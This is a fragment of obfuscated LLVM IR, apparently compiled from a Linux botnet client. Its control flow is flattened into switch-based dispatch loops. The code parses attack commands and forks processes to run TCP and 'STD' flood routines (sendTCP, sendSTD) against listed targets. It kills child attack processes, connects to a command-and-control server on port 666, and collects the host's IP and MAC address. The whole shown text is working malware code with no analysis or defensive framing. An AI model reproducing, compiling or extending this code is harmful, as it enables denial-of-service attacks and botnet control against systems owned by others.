  %365 = select i1 %364, i32 -455834007, i32 -564082489
  store i32 %365, i32* %switchVar
  br label %loopEnd

; <label>:366:                                    ; preds = %loopEntry
  %367 = load i8**, i8*** %4, align 8
  %368 = getelementptr inbounds i8*, i8** %367, i64 6
  %369 = load i8*, i8** %368, align 8
  %370 = call i32 @atoi(i8* %369) #10
  %371 = icmp slt i32 %370, 0
  %372 = select i1 %371, i32 1565261942, i32 -564082489
  store i32 %372, i32* %switchVar
  br label %loopEnd

; <label>:373:                                    ; preds = %loopEntry
  %374 = load i32, i32* %3, align 4
  %375 = icmp eq i32 %374, 8
  %376 = select i1 %375, i32 1766389210, i32 -1458449848
  store i32 %376, i32* %switchVar
  br label %loopEnd

; <label>:377:                                    ; preds = %loopEntry
  %378 = load i8**, i8*** %4, align 8
  %379 = getelementptr inbounds i8*, i8** %378, i64 7
  %380 = load i8*, i8** %379, align 8
  %381 = call i32 @atoi(i8* %380) #10
  %382 = icmp slt i32 %381, 1
  %383 = select i1 %382, i32 1565261942, i32 -1458449848
  store i32 %383, i32* %switchVar
  br label %loopEnd

; <label>:384:                                    ; preds = %loopEntry
  store i32 -252323774, i32* %switchVar
  br label %loopEnd

; <label>:385:                                    ; preds = %loopEntry
  %386 = load i8**, i8*** %4, align 8
  %387 = getelementptr inbounds i8*, i8** %386, i64 1
  %388 = load i8*, i8** %387, align 8
  store i8* %388, i8** %17, align 8
  %389 = load i8**, i8*** %4, align 8
  %390 = getelementptr inbounds i8*, i8** %389, i64 2
  %391 = load i8*, i8** %390, align 8
  %392 = call i32 @atoi(i8* %391) #10
  store i32 %392, i32* %18, align 4
  %393 = load i8**, i8*** %4, align 8
  %394 = getelementptr inbounds i8*, i8** %393, i64 3
  %395 = load i8*, i8** %394, align 8
  %396 = call i32 @atoi(i8* %395) #10
  store i32 %396, i32* %19, align 4
  %397 = load i8**, i8*** %4, align 8
  %398 = getelementptr inbounds i8*, i8** %397, i64 4
  %399 = load i8*, i8** %398, align 8
  %400 = call i32 @atoi(i8* %399) #10
  store i32 %400, i32* %20, align 4
  %401 = load i8**, i8*** %4, align 8
  %402 = getelementptr inbounds i8*, i8** %401, i64 5
  %403 = load i8*, i8** %402, align 8
  store i8* %403, i8** %21, align 8
  %404 = load i32, i32* %3, align 4
  %405 = icmp eq i32 %404, 8
  %406 = select i1 %405, i32 -6792578, i32 -1937823040
  store i32 %406, i32* %switchVar
  br label %loopEnd

; <label>:407:                                    ; preds = %loopEntry
  %408 = load i8**, i8*** %4, align 8
  %409 = getelementptr inbounds i8*, i8** %408, i64 7
  %410 = load i8*, i8** %409, align 8
  %411 = call i32 @atoi(i8* %410) #10
  store i32 271183001, i32* %switchVar
  store i32 %411, i32* %.reg2mem8
  br label %loopEnd

; <label>:412:                                    ; preds = %loopEntry
  store i32 271183001, i32* %switchVar
  store i32 10, i32* %.reg2mem8
  br label %loopEnd

; <label>:413:                                    ; preds = %loopEntry
  %.reload9 = load i32, i32* %.reg2mem8
  store i32 %.reload9, i32* %22, align 4
  %414 = load i32, i32* %3, align 4
  %415 = icmp sgt i32 %414, 6
  %416 = select i1 %415, i32 -1295591810, i32 -1403195339
  store i32 %416, i32* %switchVar
  br label %loopEnd

; <label>:417:                                    ; preds = %loopEntry
  %418 = load i8**, i8*** %4, align 8
  %419 = getelementptr inbounds i8*, i8** %418, i64 6
  %420 = load i8*, i8** %419, align 8
  %421 = call i32 @atoi(i8* %420) #10
  store i32 -917608865, i32* %switchVar
  store i32 %421, i32* %.reg2mem10
  br label %loopEnd

; <label>:422:                                    ; preds = %loopEntry
  store i32 -917608865, i32* %switchVar
  store i32 0, i32* %.reg2mem10
  br label %loopEnd

; <label>:423:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  store i32 %.reload11, i32* %23, align 4
  %424 = load i8*, i8** %17, align 8
  %425 = call i8* @strstr(i8* %424, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #10
  %426 = icmp ne i8* %425, null
  %427 = select i1 %426, i32 728595900, i32 1153546933
  store i32 %427, i32* %switchVar
  br label %loopEnd

; <label>:428:                                    ; preds = %loopEntry
  %429 = load i8*, i8** %17, align 8
  %430 = call i8* @strtok(i8* %429, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %430, i8** %24, align 8
  store i32 -1689090158, i32* %switchVar
  br label %loopEnd

; <label>:431:                                    ; preds = %loopEntry
  %432 = load i8*, i8** %24, align 8
  %433 = icmp ne i8* %432, null
  %434 = select i1 %433, i32 -1616474090, i32 -1738151599
  store i32 %434, i32* %switchVar
  br label %loopEnd

; <label>:435:                                    ; preds = %loopEntry
  %436 = call i32 @listFork()
  %437 = icmp ne i32 %436, 0
  %438 = select i1 %437, i32 -898223510, i32 1811590275
  store i32 %438, i32* %switchVar
  br label %loopEnd

; <label>:439:                                    ; preds = %loopEntry
  %440 = load i8*, i8** %24, align 8
  %441 = load i32, i32* %18, align 4
  %442 = load i32, i32* %19, align 4
  %443 = load i32, i32* %20, align 4
  %444 = load i8*, i8** %21, align 8
  %445 = load i32, i32* %23, align 4
  %446 = load i32, i32* %22, align 4
  call void @sendTCP(i8* %440, i32 %441, i32 %442, i32 %443, i8* %444, i32 %445, i32 %446)
  call void @_exit(i32 0) #12
  unreachable

; <label>:447:                                    ; preds = %loopEntry
  %448 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %448, i8** %24, align 8
  store i32 -1689090158, i32* %switchVar
  br label %loopEnd

; <label>:449:                                    ; preds = %loopEntry
  store i32 1177007252, i32* %switchVar
  br label %loopEnd

; <label>:450:                                    ; preds = %loopEntry
  %451 = call i32 @listFork()
  %452 = icmp ne i32 %451, 0
  %453 = select i1 %452, i32 -2013927072, i32 2117612058
  store i32 %453, i32* %switchVar
  br label %loopEnd

; <label>:454:                                    ; preds = %loopEntry
  %455 = load i8*, i8** %17, align 8
  %456 = load i32, i32* %18, align 4
  %457 = load i32, i32* %19, align 4
  %458 = load i32, i32* %20, align 4
  %459 = load i8*, i8** %21, align 8
  %460 = load i32, i32* %23, align 4
  %461 = load i32, i32* %22, align 4
  call void @sendTCP(i8* %455, i32 %456, i32 %457, i32 %458, i8* %459, i32 %460, i32 %461)
  call void @_exit(i32 0) #12
  unreachable

; <label>:462:                                    ; preds = %loopEntry
  store i32 1177007252, i32* %switchVar
  br label %loopEnd

; <label>:463:                                    ; preds = %loopEntry
  store i32 -1980566219, i32* %switchVar
  br label %loopEnd

; <label>:464:                                    ; preds = %loopEntry
  %465 = load i8**, i8*** %4, align 8
  %466 = getelementptr inbounds i8*, i8** %465, i64 0
  %467 = load i8*, i8** %466, align 8
  %468 = call i32 @strcmp(i8* %467, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.403, i32 0, i32 0)) #10
  %469 = icmp ne i32 %468, 0
  %470 = select i1 %469, i32 -1180294616, i32 1491876350
  store i32 %470, i32* %switchVar
  br label %loopEnd

; <label>:471:                                    ; preds = %loopEntry
  %472 = load i32, i32* %3, align 4
  %473 = icmp slt i32 %472, 4
  %474 = select i1 %473, i32 2099486418, i32 2001252443
  store i32 %474, i32* %switchVar
  br label %loopEnd

; <label>:475:                                    ; preds = %loopEntry
  %476 = load i8**, i8*** %4, align 8
  %477 = getelementptr inbounds i8*, i8** %476, i64 2
  %478 = load i8*, i8** %477, align 8
  %479 = call i32 @atoi(i8* %478) #10
  %480 = icmp slt i32 %479, 1
  %481 = select i1 %480, i32 2099486418, i32 2009078631
  store i32 %481, i32* %switchVar
  br label %loopEnd

; <label>:482:                                    ; preds = %loopEntry
  %483 = load i8**, i8*** %4, align 8
  %484 = getelementptr inbounds i8*, i8** %483, i64 3
  %485 = load i8*, i8** %484, align 8
  %486 = call i32 @atoi(i8* %485) #10
  %487 = icmp slt i32 %486, 1
  %488 = select i1 %487, i32 2099486418, i32 813620292
  store i32 %488, i32* %switchVar
  br label %loopEnd

; <label>:489:                                    ; preds = %loopEntry
  store i32 -252323774, i32* %switchVar
  br label %loopEnd

; <label>:490:                                    ; preds = %loopEntry
  %491 = load i8**, i8*** %4, align 8
  %492 = getelementptr inbounds i8*, i8** %491, i64 1
  %493 = load i8*, i8** %492, align 8
  store i8* %493, i8** %25, align 8
  %494 = load i8**, i8*** %4, align 8
  %495 = getelementptr inbounds i8*, i8** %494, i64 2
  %496 = load i8*, i8** %495, align 8
  %497 = call i32 @atoi(i8* %496) #10
  store i32 %497, i32* %26, align 4
  %498 = load i8**, i8*** %4, align 8
  %499 = getelementptr inbounds i8*, i8** %498, i64 3
  %500 = load i8*, i8** %499, align 8
  %501 = call i32 @atoi(i8* %500) #10
  store i32 %501, i32* %27, align 4
  %502 = load i8*, i8** %25, align 8
  %503 = call i8* @strstr(i8* %502, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #10
  %504 = icmp ne i8* %503, null
  %505 = select i1 %504, i32 2131884128, i32 1147880012
  store i32 %505, i32* %switchVar
  br label %loopEnd

; <label>:506:                                    ; preds = %loopEntry
  %507 = load i8*, i8** %25, align 8
  %508 = call i8* @strtok(i8* %507, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %508, i8** %28, align 8
  store i32 1971346143, i32* %switchVar
  br label %loopEnd

; <label>:509:                                    ; preds = %loopEntry
  %510 = load i8*, i8** %28, align 8
  %511 = icmp ne i8* %510, null
  %512 = select i1 %511, i32 -735030246, i32 1172954843
  store i32 %512, i32* %switchVar
  br label %loopEnd

; <label>:513:                                    ; preds = %loopEntry
  %514 = call i32 @listFork()
  %515 = icmp ne i32 %514, 0
  %516 = select i1 %515, i32 552164935, i32 -1887068123
  store i32 %516, i32* %switchVar
  br label %loopEnd

; <label>:517:                                    ; preds = %loopEntry
  %518 = load i8*, i8** %28, align 8
  %519 = load i32, i32* %26, align 4
  %520 = load i32, i32* %27, align 4
  call void @sendSTD(i8* %518, i32 %519, i32 %520)
  call void @_exit(i32 0) #12
  unreachable

; <label>:521:                                    ; preds = %loopEntry
  %522 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %522, i8** %28, align 8
  store i32 1971346143, i32* %switchVar
  br label %loopEnd

; <label>:523:                                    ; preds = %loopEntry
  store i32 -1422741028, i32* %switchVar
  br label %loopEnd

; <label>:524:                                    ; preds = %loopEntry
  %525 = call i32 @listFork()
  %526 = icmp ne i32 %525, 0
  %527 = select i1 %526, i32 1906400057, i32 1593906929
  store i32 %527, i32* %switchVar
  br label %loopEnd

; <label>:528:                                    ; preds = %loopEntry
  store i32 -252323774, i32* %switchVar
  br label %loopEnd

; <label>:529:                                    ; preds = %loopEntry
  %530 = load i8*, i8** %25, align 8
  %531 = load i32, i32* %26, align 4
  %532 = load i32, i32* %27, align 4
  call void @sendSTD(i8* %530, i32 %531, i32 %532)
  call void @_exit(i32 0) #12
  unreachable

; <label>:533:                                    ; preds = %loopEntry
  store i32 -1180294616, i32* %switchVar
  br label %loopEnd

; <label>:534:                                    ; preds = %loopEntry
  %535 = load i8**, i8*** %4, align 8
  %536 = getelementptr inbounds i8*, i8** %535, i64 0
  %537 = load i8*, i8** %536, align 8
  %538 = call i32 @strcmp(i8* %537, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.404, i32 0, i32 0)) #10
  %539 = icmp ne i32 %538, 0
  %540 = select i1 %539, i32 -252323774, i32 20783243
  store i32 %540, i32* %switchVar
  br label %loopEnd

; <label>:541:                                    ; preds = %loopEntry
  store i32 0, i32* %29, align 4
  store i64 0, i64* %30, align 8
  store i32 1197735659, i32* %switchVar
  br label %loopEnd

; <label>:542:                                    ; preds = %loopEntry
  %543 = load i64, i64* %30, align 8
  %544 = load i64, i64* @numpids, align 8
  %545 = icmp ult i64 %543, %544
  %546 = select i1 %545, i32 1304222695, i32 850162056
  store i32 %546, i32* %switchVar
  br label %loopEnd

; <label>:547:                                    ; preds = %loopEntry
  %548 = load i32*, i32** @pids, align 8
  %549 = load i64, i64* %30, align 8
  %550 = getelementptr inbounds i32, i32* %548, i64 %549
  %551 = load i32, i32* %550, align 4
  %552 = icmp ne i32 %551, 0
  %553 = select i1 %552, i32 -1474805823, i32 -982351851
  store i32 %553, i32* %switchVar
  br label %loopEnd

; <label>:554:                                    ; preds = %loopEntry
  %555 = load i32*, i32** @pids, align 8
  %556 = load i64, i64* %30, align 8
  %557 = getelementptr inbounds i32, i32* %555, i64 %556
  %558 = load i32, i32* %557, align 4
  %559 = call i32 @getpid() #2
  %560 = icmp ne i32 %558, %559
  %561 = select i1 %560, i32 -1345391485, i32 -982351851
  store i32 %561, i32* %switchVar
  br label %loopEnd

; <label>:562:                                    ; preds = %loopEntry
  %563 = load i32*, i32** @pids, align 8
  %564 = load i64, i64* %30, align 8
  %565 = getelementptr inbounds i32, i32* %563, i64 %564
  %566 = load i32, i32* %565, align 4
  %567 = call i32 @kill(i32 %566, i32 9) #2
  %568 = load i32, i32* %29, align 4
  %569 = add nsw i32 %568, 1
  store i32 %569, i32* %29, align 4
  store i32 -982351851, i32* %switchVar
  br label %loopEnd

; <label>:570:                                    ; preds = %loopEntry
  store i32 -1010783426, i32* %switchVar
  br label %loopEnd

; <label>:571:                                    ; preds = %loopEntry
  %572 = load i64, i64* %30, align 8
  %573 = add i64 %572, 1
  store i64 %573, i64* %30, align 8
  store i32 1197735659, i32* %switchVar
  br label %loopEnd

; <label>:574:                                    ; preds = %loopEntry
  store i32 -252323774, i32* %switchVar
  br label %loopEnd

; <label>:575:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %574, %571, %570, %562, %554, %547, %542, %541, %534, %533, %528, %524, %523, %521, %513, %509, %506, %490, %489, %482, %475, %471, %464, %463, %462, %450, %449, %447, %435, %431, %428, %423, %422, %417, %413, %412, %407, %385, %384, %377, %373, %366, %362, %355, %348, %341, %334, %330, %323, %322, %321, %308, %307, %305, %292, %288, %285, %280, %279, %274, %270, %269, %264, %260, %259, %254, %231, %230, %223, %219, %212, %205, %198, %191, %184, %177, %170, %166, %159, %119, %115, %114, %107, %100, %96, %89, %88, %84, %83, %79, %77, %72, %71, %67, %60, %57, %56, %52, %45, %38, %37, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 4096, i32 16, i1 false)
  %5 = load i32, i32* @HeliosCommSock, align 4
  store i32 %5, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1381405040, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1381405040, label %first
    i32 -1428224061, label %8
    i32 -999065638, label %11
    i32 84225179, label %17
    i32 -889783492, label %18
    i32 -1599250281, label %21
    i32 -1495353034, label %32
    i32 -1331275955, label %39
    i32 662920204, label %47
    i32 1455207506, label %48
    i32 -1006775438, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %6 = icmp ne i32 %.reload, 0
  %7 = select i1 %6, i32 -1428224061, i32 -999065638
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* @HeliosCommSock, align 4
  %10 = call i32 @close(i32 %9)
  store i32 0, i32* @HeliosCommSock, align 4
  store i32 -999065638, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* @currentServer, align 4
  %13 = add nsw i32 %12, 1
  %14 = sext i32 %13 to i64
  %15 = icmp eq i64 %14, 1
  %16 = select i1 %15, i32 84225179, i32 -889783492
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 0, i32* @currentServer, align 4
  store i32 -1599250281, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* @currentServer, align 4
  %20 = add nsw i32 %19, 1
  store i32 %20, i32* @currentServer, align 4
  store i32 -1599250281, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %23 = load i32, i32* @currentServer, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds [1 x i8*], [1 x i8*]* @AllDemDupes, i64 0, i64 %24
  %26 = load i8*, i8** %25, align 8
  %27 = call i8* @strcpy(i8* %22, i8* %26) #2
  store i32 666, i32* %3, align 4
  %28 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %29 = call i8* @strchr(i8* %28, i32 58) #10
  %30 = icmp ne i8* %29, null
  %31 = select i1 %30, i32 -1495353034, i32 -1331275955
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %34 = call i8* @strchr(i8* %33, i32 58) #10
  %35 = getelementptr inbounds i8, i8* %34, i64 1
  %36 = call i32 @atoi(i8* %35) #10
  store i32 %36, i32* %3, align 4
  %37 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %38 = call i8* @strchr(i8* %37, i32 58) #10
  store i8 0, i8* %38, align 1
  store i32 -1331275955, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %40, i32* @HeliosCommSock, align 4
  %41 = load i32, i32* @HeliosCommSock, align 4
  %42 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %43 = load i32, i32* %3, align 4
  %44 = call i32 @connectTimeout(i32 %41, i8* %42, i32 %43, i32 30)
  %45 = icmp ne i32 %44, 0
  %46 = select i1 %45, i32 1455207506, i32 662920204
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 1, i32* %1, align 4
  store i32 -1006775438, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -1006775438, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  ret i32 %50

loopEnd:                                          ; preds = %48, %47, %39, %32, %21, %18, %17, %11, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 285384902, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 285384902, label %first
    i32 -731630882, label %16
    i32 -1155089433, label %17
    i32 199396340, label %31
    i32 236090644, label %32
    i32 33711791, label %39
    i32 -2018277791, label %40
    i32 -119302165, label %45
    i32 -1848299533, label %51
    i32 1984517239, label %56
    i32 1029136117, label %58
    i32 -764605058, label %64
    i32 607233513, label %67
    i32 -2139368082, label %69
    i32 -418630962, label %71
    i32 461775857, label %78
    i32 -45563810, label %86
    i32 1245280997, label %90
    i32 1340093872, label %102
    i32 1732072722, label %105
    i32 1031209946, label %106
    i32 -445658667, label %109
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp eq i32 %.reload, -1
  %15 = select i1 %14, i32 -731630882, i32 -1155089433
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -445658667, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 16, i32 4, i1 false)
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %19, align 4
  %20 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.405, i32 0, i32 0)) #2
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %22 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %21, i32 0, i32 0
  store i32 %20, i32* %22, align 4
  %23 = call zeroext i16 @htons(i16 zeroext 53) #13
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %23, i16* %24, align 2
  %25 = load i32, i32* %2, align 4
  %26 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %27 = call i32 @connect(i32 %25, %struct.sockaddr* %26, i32 16)
  store i32 %27, i32* %4, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp eq i32 %28, -1
  %30 = select i1 %29, i32 199396340, i32 236090644
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -445658667, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 16, i32* %6, align 4
  %33 = load i32, i32* %2, align 4
  %34 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %35 = call i32 @getsockname(i32 %33, %struct.sockaddr* %34, i32* %6) #2
  store i32 %35, i32* %4, align 4
  %36 = load i32, i32* %4, align 4
  %37 = icmp eq i32 %36, -1
  %38 = select i1 %37, i32 33711791, i32 -2018277791
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -445658667, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %42 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %41, i32 0, i32 0
  %43 = load i32, i32* %42, align 4
  store i32 %43, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %44 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.406, i32 0, i32 0), i32 0)
  store i32 %44, i32* %7, align 4
  store i32 -119302165, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %47 = load i32, i32* %7, align 4
  %48 = call i8* @fdgets(i8* %46, i32 4096, i32 %47)
  %49 = icmp ne i8* %48, null
  %50 = select i1 %49, i32 -1848299533, i32 -418630962
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %53 = call i8* @strstr(i8* %52, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.407, i32 0, i32 0)) #10
  %54 = icmp ne i8* %53, null
  %55 = select i1 %54, i32 1984517239, i32 -2139368082
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %57, i8** %9, align 8
  store i32 1029136117, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i8*, i8** %9, align 8
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp ne i32 %61, 9
  %63 = select i1 %62, i32 -764605058, i32 607233513
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i8*, i8** %9, align 8
  %66 = getelementptr inbounds i8, i8* %65, i32 1
  store i8* %66, i8** %9, align 8
  store i32 1029136117, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i8*, i8** %9, align 8
  store i8 0, i8* %68, align 1
  store i32 -418630962, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %70, i8 0, i64 4096, i32 16, i1 false)
  store i32 -119302165, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %7, align 4
  %73 = call i32 @close(i32 %72)
  %74 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %75 = load i8, i8* %74, align 16
  %76 = icmp ne i8 %75, 0
  %77 = select i1 %76, i32 461775857, i32 1031209946
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %80 = bitcast %union.anon.5* %79 to [16 x i8]*
  %81 = getelementptr inbounds [16 x i8], [16 x i8]* %80, i32 0, i32 0
  %82 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %83 = call i8* @strcpy(i8* %81, i8* %82) #2
  %84 = load i32, i32* %2, align 4
  %85 = call i32 (i32, i64, ...) @ioctl(i32 %84, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  store i32 -45563810, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* %10, align 4
  %88 = icmp slt i32 %87, 6
  %89 = select i1 %88, i32 1245280997, i32 1732072722
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %92 = bitcast %union.anon.6* %91 to %struct.sockaddr*
  %93 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %92, i32 0, i32 1
  %94 = getelementptr inbounds [14 x i8], [14 x i8]* %93, i32 0, i32 0
  %95 = load i32, i32* %10, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i8, i8* %94, i64 %96
  %98 = load i8, i8* %97, align 1
  %99 = load i32, i32* %10, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %100
  store i8 %98, i8* %101, align 1
  store i32 1340093872, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i32, i32* %10, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %10, align 4
  store i32 -45563810, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 1031209946, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %2, align 4
  %108 = call i32 @close(i32 %107)
  store i32 -445658667, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  %110 = load i32, i32* %1, align 4
  ret i32 %110

loopEnd:                                          ; preds = %106, %105, %102, %90, %86, %78, %71, %69, %67, %64, %58, %56, %51, %45, %40, %39, %32, %31, %17, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.408, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %.reg2mem = alloca %struct._IO_FILE*
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca [256 x i8], align 16
  %12 = alloca i8*, align 8
  %13 = alloca %struct._IO_FILE*, align 8
  %14 = alloca [256 x i8], align 16
  %15 = alloca [1024 x i8], align 16
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca %struct._IO_FILE*, align 8
